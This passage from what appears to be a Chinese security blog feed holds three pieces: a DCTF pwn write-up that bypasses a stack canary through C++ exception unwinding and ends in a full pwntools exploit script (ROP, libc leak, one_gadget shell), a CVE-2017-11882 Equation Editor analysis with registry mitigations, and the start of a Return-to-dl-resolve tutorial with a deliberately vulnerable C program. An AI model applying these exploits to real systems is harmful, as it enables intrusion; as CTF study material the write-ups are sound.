unwind.  Further, note where we found a handler.  */</span></span><br><span class="line">  exc-&gt;private_1 = <span class="number">0</span>;</span><br><span class="line">  exc-&gt;private_2 = uw_identify_context (&amp;cur_context);</span><br><span class="line"></span><br><span class="line">  cur_context = this_context;</span><br><span class="line">  code = _Unwind_RaiseException_Phase2 (exc, &amp;cur_context);</span><br><span class="line">  <span class="keyword">if</span> (code != _URC_INSTALL_CONTEXT)</span><br><span class="line">    <span class="keyword">return</span> code;</span><br><span class="line"></span><br><span class="line">  uw_install_context (&amp;this_context, &amp;cur_context);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> _Unwind_Reason_Code</span><br><span class="line">_Unwind_RaiseException_Phase2(struct _Unwind_Exception *exc,</span><br><span class="line">                  struct _Unwind_Context *context)</span><br><span class="line">&#123;</span><br><span class="line">  _Unwind_Reason_Code code;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      _Unwind_FrameState fs;</span><br><span class="line">      <span class="keyword">int</span> match_handler;</span><br><span class="line"></span><br><span class="line">      code = uw_frame_state_for (context, &amp;fs);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Identify when we&#x27;ve reached the designated handler context.  */</span></span><br><span class="line">      match_handler = (uw_identify_context (context) == exc-&gt;private_2</span><br><span class="line">               ? _UA_HANDLER_FRAME : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (code != _URC_NO_REASON)</span><br><span class="line">    <span class="comment">/* Some error encountered.  Usually the unwinder doesn&#x27;t</span></span><br><span class="line"><span class="comment">       diagnose these and merely crashes.  */</span></span><br><span class="line">      <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Unwind successful.  Run the personality routine, if any.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fs.personality)</span><br><span class="line">      &#123;</span><br><span class="line">        code = (*fs.personality) (<span class="number">1</span>, _UA_CLEANUP_PHASE | match_handler,</span><br><span class="line">                    exc-&gt;exception_class, exc, context);</span><br><span class="line">        <span class="keyword">if</span> (code == _URC_INSTALL_CONTEXT)</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (code != _URC_CONTINUE_UNWIND) </span><br><span class="line">          <span class="keyword">return</span> _URC_FATAL_PHASE2_ERROR;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Don&#x27;t let us unwind past the handler context.  */</span></span><br><span class="line">      <span class="keyword">if</span> (match_handler)</span><br><span class="line">         <span class="built_in">abort</span> ();</span><br><span class="line"></span><br><span class="line">      uw_update_context (context, &amp;fs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上两个函数分别对应了 unwind 过程中的这两个阶段，注意其中的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bashuw_init_context()</span><br><span class="line">uw_frame_state_for()</span><br><span class="line">uw_update_context()</span><br></pre></td></tr></table></figure><p>这几个函数主要是用来重建函数调用现场的，我们只需要知道它们的很大一部分上下文是可以从堆栈上恢复回来的,如 ebp, esp, 返回地址等。</p><p>而这个时候，从栈中恢复保存的ebp值，是从<strong>sub_401148</strong>或者是从<strong>sub_401148</strong>的上一层函数的ebp呢？</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-16.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-16.jpg"></a></p><p>其实从异常捕获结束后流程跳转到40155F我们就可以知道了，这里的leave，相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp;  恢复esp同时回收局部变量空间</span><br><span class="line">pop ebp;          从栈中恢复保存的ebp的值</span><br></pre></td></tr></table></figure><p>这样一返回，就完全跳过了<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dcif-final-15.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dcif-final-15.jpg"></a><br>canary 的检查</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>如果异常被上一个函数的catch捕获，所以rbp变成了上一个函数的rbp， 而通过构造一个payload把上一个函数的rbp修改成stack_pivot地址， 之后上一个函数返回的时候执行leave ret，这样一来我们就能成功绕过canary的检查</p><p>而且进一步我们也能控制eip，，去执行了stack_pivot中的rop了</p><h3 id="寻找stack-pivot"><a href="#寻找stack-pivot" class="headerlink" title="寻找stack_pivot"></a>寻找stack_pivot</h3><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-18.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-18.jpg"></a></p><p>如何去覆盖rbp呢?</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">message_pattern=<span class="number">0x6061C0</span></span><br><span class="line">ret=<span class="number">0x40150c</span>   </span><br><span class="line">payload1=p64(message_pattern)*<span class="number">37</span>+p64(ret)</span><br></pre></td></tr></table></figure><p>构造如此的payload去覆盖rbp<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-19.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-19.jpg"></a></p><p>紧接着我们是需要去做一个payload去做infoleak，所以我们利用栈溢出，构造puts 去打印puts_got,获取puts在内存中的地址..然后通过异常机制绕过canary…</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+<span class="number">0x50</span>)+p64(pop_rsi_r15)+p64(<span class="number">1024</span>)+p64(message_pattern+<span class="number">0x50</span>)+p64(readn)</span><br></pre></td></tr></table></figure><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-20.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-20.jpg"></a></p><p>调试过程中，我们也可以看到开始做infoleak了。。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-21.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-21.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-22.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-dctf-final-22.jpg"></a></p><p>当这个比较相等的时候，便能进入异常捕获的机制了…</p><p>随后，我们就自然而然的跳过了canary的检查…然后我们只需要在构造一个read..写一个one_gadget_rce到stack_pivot上…然后控制返回地址回stack_pivot便能获取一个shell了…</p><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./pwn.bak&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#def attach():</span></span><br><span class="line"><span class="comment">#    gdb.attach(io, execute=&quot;source bp&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;option:\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;(yes/No)&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;No&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;(yes/No)&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x400F45</span></span><br><span class="line"><span class="string"> break *0x4012D4</span></span><br><span class="line"><span class="string"> break *0x40153d&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(<span class="string">&#x27;-2&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;charset:&quot;</span>)</span><br><span class="line">raw_input(<span class="string">&quot;send payload 1 overwrite stack ebp --&gt; stack_pivot&quot;</span>)</span><br><span class="line">message_pattern=<span class="number">0x6061C0</span></span><br><span class="line">ret=<span class="number">0x40150c</span>   </span><br><span class="line">payload1=p64(message_pattern)*<span class="number">37</span>+p64(ret)  <span class="comment">#overwrite stack ebp --&gt; stack_pivot</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts_plt=<span class="number">0x400BD0</span></span><br><span class="line">puts_got=<span class="number">0x606020</span></span><br><span class="line">readn=<span class="number">0x400F1E</span>  </span><br><span class="line">pop_rdi=<span class="number">0x4044d3</span></span><br><span class="line">pop_rsi_r15=<span class="number">0x4044d1</span></span><br><span class="line">raw_input(<span class="string">&#x27;send payload 2 to leak puts addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(pop_rdi)+p64(message_pattern+<span class="number">0x50</span>)+p64(pop_rsi_r15)+p64(<span class="number">1024</span>)+p64(message_pattern+<span class="number">0x50</span>)+p64(readn)</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(put@got) -&gt; readn_0x400f1e( stack_pivot + 0x50, 1024 ) one_gadget_addr to ret -&gt; one_gadget</span></span><br><span class="line">io.send(payload2)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&quot;pattern:\n&quot;</span>)</span><br><span class="line">puts=io.recvuntil(<span class="string">&quot;\n&quot;</span>)[:<span class="number">-1</span>]</span><br><span class="line">puts=puts.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">puts=u64(puts)</span><br><span class="line">libc_base=puts-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0xF2519</span></span><br><span class="line">raw_input(<span class="string">&#x27;send payload3 with one gadget rce&#x27;</span>)</span><br><span class="line">payload3=p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#due to that the exception_handling program is define in func flex_md5_401500, faked ebp_save will be poped to ebp, when exception_handling program finishes, ip will be set to &#x27;leave retn&#x27; so we can control ip and stack(stack pivot in bss) than leak and exec.</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/catch/p/3604516.html">https://www.cnblogs.com/catch/p/3604516.html</a><br><a href="http://baiy.cn/doc/cpp/inside_exception.htm">http://baiy.cn/doc/cpp/inside_exception.htm</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> DCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-11882-analyze</title>
      <link href="CVE-2017-11882-analyze.html"/>
      <url>CVE-2017-11882-analyze.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h1><p>我今天才拿到样本，尝试稍微分析一下下</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-01.jpg"></a></p><p>这个漏洞是基于offcie公式编辑器的一个栈溢出。由于该公式编辑器已经有17年没有进一步更新，而且这个公式编辑器并不是直接依托于office，所以office一些软件保护，这个公式编辑器事实上是不存在的</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-02.jpg"></a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>组件位置位于  <code>C:\Program Files (x86)\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE</code></p><h1 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h1><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2017-11882-03.jpg"></a></p><p>004164FA地址的功能主要是从内部表单复制以空字符结尾的字符串作为第一个参数发送给它的缓冲区</p><p>程序可以从另外两个程序中调用。他们都将固定长度的堆栈数据传递给它。这两个过程更重要的是容易受到缓冲区溢出的影响。发现第一个调用与EqnFrameWinProc函数中处理的某个窗口消息有关。换句话说，利用这个电话是不平凡的任务。</p><p>第二个调用又与处理从等式二进制形式复制的字体名称有关。调用可以通过调用IPersistStorage :: Load来执行。但是，直接使用该函数是不可能的，因为如果溢出了，就会调用另一个溢出的过程。第一个函数的缓冲区太大，会覆盖第二个函数的所有参数，在执行的时候会访问无效的内存位置。因此，组件进程将会崩溃，直到攻击者控制的代码被执行。为了方便起见，在研究范围内，我们将其命名为LogfontStruct_Overflow。该函数具有00421774地址，并在LOGFONTA结构中溢出缓冲区</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2018-11882-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/cve-2018-11882-04.jpg"></a></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>在这种情况下，ret2libc需要执行任意代码。来自EQNEDT32.EXE的已知设置地址的第一个字节是零字节。这就是为什么不可能从可执行文件复制由小工具构建的ROP链（组件中也存在潜在的漏洞）。</p><p>组件的过时导致以下结果：<br>EQNEDT32.EXE开发人员要求WinExec函数有一些未知的原因。<br>最后描述的功能原来是一个完美的适合WinExec。<br>第2点是可能的，因为引起缓冲区溢出的函数是溢出函数的第一个参数。第二个参数是NULL。</p><p>公式的内容使用了一种名为MTEF v.3的二进制格式进行存储。该格式的头部为28（0x1C）个字节，定义如下：<br>以已经有的poc作为调试对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">struct EQNOLEFILEHDR &#123;</span><br><span class="line"></span><br><span class="line">   WORD    cbHdr;      &#x2F;&#x2F; 格式头长度，固定为0x1C。</span><br><span class="line"></span><br><span class="line">   DWORD   version;    &#x2F;&#x2F; 固定为0x00020000。</span><br><span class="line"></span><br><span class="line">   WORD    cf;          &#x2F;&#x2F; 该公式对象的剪贴板格式。</span><br><span class="line"></span><br><span class="line">   DWORD   cbObject;  &#x2F;&#x2F; MTEF数据的长度，不包括头部。</span><br><span class="line"></span><br><span class="line">   DWORD   reserved1; &#x2F;&#x2F; 未公开</span><br><span class="line"></span><br><span class="line">   DWORD   reserved2; &#x2F;&#x2F; 未公开</span><br><span class="line"></span><br><span class="line">   DWORD   reserved3; &#x2F;&#x2F; 未公开</span><br><span class="line"></span><br><span class="line">   DWORD   reserved4; &#x2F;&#x2F; 未公开</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>攻击者可能溢出的数组大小为36个字节）。而且，可以使用v12变量和保存的EBP的空间，这又增加了8个字节。</p><p>通过插入多个利用所述漏洞的OLE，可以执行任意命令序列（例如，从Internet上下载任意文件并执行它）。</p><h1 id="解决方案："><a href="#解决方案：" class="headerlink" title="解决方案："></a>解决方案：</h1><p>1、微软已经对此漏洞做出了修复。</p><p>(1)下载<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882</a>  更新补丁进行修补</p><p>(2)开启Windows Update功能，定期对系统进行自动更新<br>2、由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p><p>l  按下Win+R组合键，打开cmd.exe</p><p>l  输入以下两条命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">reg add  “HKLM\SOFTWARE\Microsoft\Office\Common\COM     Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125; ” &#x2F;v         “Compatibility  Flags”             &#x2F;t  REG_DWORD &#x2F;d                 0x400                </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"> </span><br><span class="line">reg add  “HKLM\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM     Compatibility\&#123;0002CE02-0000-0000-C000-000000000046&#125; ” &#x2F;v         “Compatibility  Flags”             &#x2F;t  REG_DWORD &#x2F;d                 0x400 </span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> CVE-2017-11882 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>return-to-dl-resolve</title>
      <link href="Return-to-dl-resolve.html"/>
      <url>Return-to-dl-resolve.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h3 id="通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）"><a href="#通过ELF动态装载构造ROP链-（-Return-to-dl-resolve）" class="headerlink" title="通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）"></a>通过ELF动态装载构造ROP链 （ Return-to-dl-resolve）</h3><p>####0x00 前言<br>玩CTF的赛棍都知道，PWN类型的漏洞题目一般会提供一个可执行程序，同时会提供程序运行动态链接的libc库。通过libc.so可以得到库函数的偏移地址，再结合泄露GOT表中libc函数的地址，计算出进程中实际函数的地址，以绕过ASLR。这种手法叫return-to-libc。本文将介绍一种不依赖libc的手法。</p><p>以XDCTF2015-EXPLOIT2为例，这题当时是只给了可执行文件的。出这题的初衷就是想通过Return-to-dl-resolve的手法绕过NX和ASLR的限制。本文将详细介绍一下该手法的利用过程。</p><p>这里构造一个存在栈缓冲区溢出漏洞的程序，以方便后续我们构造ROP链。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln()</span><br><span class="line">&#123;</span><br><span class="line">char buf[100];</span><br><span class="line">setbuf(stdin,buf);</span><br><span class="line">read(0,buf,256); &#x2F;&#x2F; Buffer OverFlow</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">char buf[100] &#x3D; &quot;Welcome to XDCTF2015~!\n&quot;;</span><br><span class="line"></span><br><span class="line">setbuf(stdout,buf);</span><br><span class="line">write(1,buf,strlen(buf));</span><br><span class="line"></span><br><span class="line">vuln();</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-准备知识"><a href="#0x01-准备知识" class="headerlink" title="0x01 准备知识"></a>0x01 准备知识</h4><h5 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h5><p>ELF可执行文件由ELF头部，程序头部表和其对应的段，节区头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为 <code>PT_DYNAMIC</code> 的段，它包含<code>.dynamic</code> 节区。结构如图，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        Elf32_Word  d_val;</span><br><span class="line">        Elf32_Addr  d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line"> &#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>其中Tag对应着每个节区。比如<code>JMPREL</code>对应着<code>.rel.plt</code><br><a href="/images/Return-to-dl-resolve/1459431478784.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459431478784.png" alt="Alt text"></a></p><p>节区中包含目标文件的所有信息。节的结构如图。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    Elf32_Word sh_name;        &#x2F;&#x2F; 节区头部字符串表节区的索引</span><br><span class="line">    Elf32_Word sh_type;        &#x2F;&#x2F; 节区类型</span><br><span class="line">    Elf32_Word sh_flags;       &#x2F;&#x2F; 节区标志，用于描述属性</span><br><span class="line">    Elf32_Addr sh_addr;        &#x2F;&#x2F; 节区的内存映像</span><br><span class="line">    Elf32_Off  sh_offset;      &#x2F;&#x2F; 节区的文件偏移</span><br><span class="line">    Elf32_Word sh_size;        &#x2F;&#x2F; 节区的长度</span><br><span class="line">    Elf32_Word sh_link;        &#x2F;&#x2F; 节区头部表索引链接</span><br><span class="line">    Elf32_Word sh_info;        &#x2F;&#x2F; 附加信息</span><br><span class="line">    Elf32_Word sh_addralign;   &#x2F;&#x2F; 节区对齐约束</span><br><span class="line">    Elf32_Word sh_entsize;     &#x2F;&#x2F; 固定大小的节区表项的长度</span><br><span class="line">&#125;Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>如图，列出了该文件的28个节区。其中类型为REL的节区包含重定位表项。<br><a href="/images/Return-to-dl-resolve/1459407202726.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459407202726.png" alt="Alt text"></a></p><p>（1） 其中<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Addr r_offset;    &#x2F;&#x2F; 对于可执行文件，此值为虚拟地址</span><br><span class="line">    Elf32_Word r_info;      &#x2F;&#x2F; 符号表索引</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(i) ((i)&gt;&gt;8)</span><br><span class="line">#define ELF32_R_TYPE(i) ((unsigned char)(i))</span><br><span class="line">#define ELF32_R_INFO(s, t) (((s)&lt;&lt;8) + (unsigned char)(t))</span><br></pre></td></tr></table></figure><p>如图，在<code>.rel.plt</code>中列出了链接的C库函数，以下均已<code>write</code>函数为例，<code>write</code>函数的<code>r_offset=0x804a010</code>,<code>r_info=0x507</code><br><a href="/images/Return-to-dl-resolve/1459407452175.png" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459407452175.png"></a></p><p>（2） 其中<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节存储着全局函数偏离表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值。如图，<code>write</code>函数在GOT表中位于<code>0x804a010</code><br><a href="/images/Return-to-dl-resolve/1459408892173.png" title="Alt text" class="gallery-item"><img src="/images/Return-to-dl-resolve/1459408892173.png" alt="Alt text"></a></p><p>（3）其中<code>.dynsym</code>节区包含了动态链接符号表。其中，<code>Elf32_Sym[num]</code>中的<code>num</code>对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义，<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info)&gt;&gt;8</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   &#x2F;* Symbol name (string tbl index) *&#x2F;</span><br><span class="line">  Elf32_Addr    st_value;  &#x2F;* Symbol value *&#x2F;</span><br><span class="line">  Elf32_Word    st_size;   &#x2F;* Symbol size *&#x2F;</span><br><span class="line">  unsigned char st_info;   &#x2F;* Symbol type and binding *&#x2F;</span><br><span class="line">  unsigned char st_other;  &#x2F;* Symbol visibility under glibc&gt;&#x3D;2.2 *&#x2F;</span><br><span class="line">  Elf32_Section st_shndx;  &#x2F;* Section index *&#x2F;</span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure><p>如图，<code>write</code>的索引值为<code>ELF32_R_SYM(0x507) = 0x507 &gt;&gt; 8 = 5</code>。而<code>Elf32_Sym[5]</code>即保存着<code>write</code>的符号表信息。并且<code>ELF32_R_TYPE(0x507) = 